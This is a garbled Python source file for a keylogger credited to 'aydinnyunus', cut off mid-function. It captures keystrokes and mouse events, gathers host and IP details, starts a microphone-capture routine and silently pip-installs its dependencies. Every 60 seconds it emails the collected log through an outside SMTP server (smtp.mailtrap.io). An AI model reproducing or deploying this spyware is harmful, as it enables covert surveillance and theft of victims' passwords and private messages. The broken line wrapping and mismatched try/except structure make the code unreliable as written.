import logging
 
import os
 
import platform
 
import smtplib
 
import socket
 
import threading
 
import wave
 
import pyscreenshot
 
import sounddevice as sd
 
from 
pynput import 
keyboard
 
from 
pynput.keyboard 
import Listener
 
from 
email import 
encoders
 
from 
email.mime.base
import 
MIMEBase
 
from 
email.mime.multipart
import 
MIMEMultipart
 
from 
email.mime.text
import 
MIMEText
 
import 
glob
 
except 
ModuleNotFoundError:
 
from 
subprocess import 
call
 
modules 
= ["pyscreenshot","sounddevice","pynput"]
 
call("pip install "
+ 
' '.join(modules),
shell=True)
 
 
 
 
 
finally:
 
EMAIL_ADDRESS 
= "YOUR_USERNAME"
 
EMAIL_PASSWORD 
= "YOUR_PASSWORD"
 
SEND_REPORT_EVERY 
= 60 
# as in seconds
 
class 
KeyLogger:
 
def 
__init__(self, 
time_interval, email, 
password):
 
self.interval
= 
time_interval
 
self.log
= 
"KeyLogger Started..."
 
self.email
= 
email
 
self.password
= 
password
 
 
 
def 
appendlog(self, 
string):
 
self.log
= 
self.log 
+ string
 
 
 
def 
on_move(self, 
x, y):
 
current_move 
= logging.info("Mouse moved to {} {}".format(x,
y))
 
self.appendlog(current_move)
 
 
 
def 
on_click(self, 
x, y):
 
current_click 
= logging.info("Mouse moved to {} {}".format(x,
y))
 
self.appendlog(current_click)
 
 
 
def 
on_scroll(self, 
x, y):
 
current_scroll 
= logging.info("Mouse moved to {} {}".format(x,
y))
 
self.appendlog(current_scroll)
 
 
 
def 
save_data(self, 
key):
 
try:
 
current_key 
= str(key.char)
 
except 
AttributeError:
 
if 
key == 
key.space:
 
current_key 
= "SPACE"
 
elif 
key == 
key.esc:
 
current_key 
= "ESC"
 
else:
 
current_key 
= " " 
+ str(key)
+ 
" "
 
 
 
self.appendlog(current_key)
 
 
 
def 
send_mail(self, 
email, password, 
message):
 
sender 
= "Private Person <from@example.com>"
 
receiver 
= "A Test User <to@example.com>"
 
 
 
m 
= f"""\
 
Subject: main Mailtrap
 
To: {receiver}
 
From: {sender}
 
 
 
Keylogger by aydinnyunus\n"""
 
 
 
m 
+= message
 
with 
smtplib.SMTP("smtp.mailtrap.io",
2525) 
as server:
 
server.login(email,
password)
 
server.sendmail(sender,
receiver, 
message)
 
 
 
def 
report(self):
 
self.send_mail(self.email,
self.password,
"\n\n"
+ 
self.log)
 
self.log
= 
""
 
timer 
= threading.Timer(self.interval,
self.report)
 
timer.start()
 
 
 
def 
system_information(self):
 
hostname 
= socket.gethostname()
 
ip 
= socket.gethostbyname(hostname)
 
plat 
= platform.processor()
 
system 
= platform.system()
 
machine 
= platform.machine()
 
self.appendlog(hostname)
 
self.appendlog(ip)
 
self.appendlog(plat)
 
self.appendlog(system)
 
self.appendlog(machine)
 
 
 
def 
microphone(self):
 
fs 
